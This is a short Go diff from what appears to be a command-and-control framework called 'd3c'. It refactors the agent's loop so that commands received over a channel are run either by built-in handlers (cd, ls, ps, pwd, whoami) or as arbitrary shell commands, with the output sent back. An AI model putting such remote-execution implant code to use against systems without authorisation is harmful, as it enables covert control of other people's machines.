@@ -2,6 +2,9 @@ package main
 
 import (
 	"crypto/md5"
+	"d3c/agent/agent_helpers"
+	"d3c/agent/commands"
+	"d3c/agent/interfaces"
 	"encoding/gob"
 	"encoding/hex"
 	"fmt"
@@ -52,8 +55,22 @@ func main() {
 		gob.NewDecoder(channel).Decode(&message)
 
 		if messageContainsCommand(message) {
-			for i, v := range message.Commands {
-				message.Commands[i].Response = execCommand(v.Request, i)
+			for i, command := range message.Commands {
+				commandID := agent_helpers.CommandValidation(helpers.CommandsSplit(command.Request)[0])
+
+				if commandID != -1 {
+					mapping := map[int]interfaces.Command{
+						1: commands.Cd{Command: command.Request},
+						2: commands.Ls{Command: command.Request},
+						3: commands.Ps{},
+						4: commands.Pwd{},
+						5: commands.Whoami{},
+					}
+
+					message.Commands[i].Response, _ = mapping[commandID].Exec()
+				} else {
+					message.Commands[i].Response = shellExecution(command.Request)
+				}
 			}
 		}
 
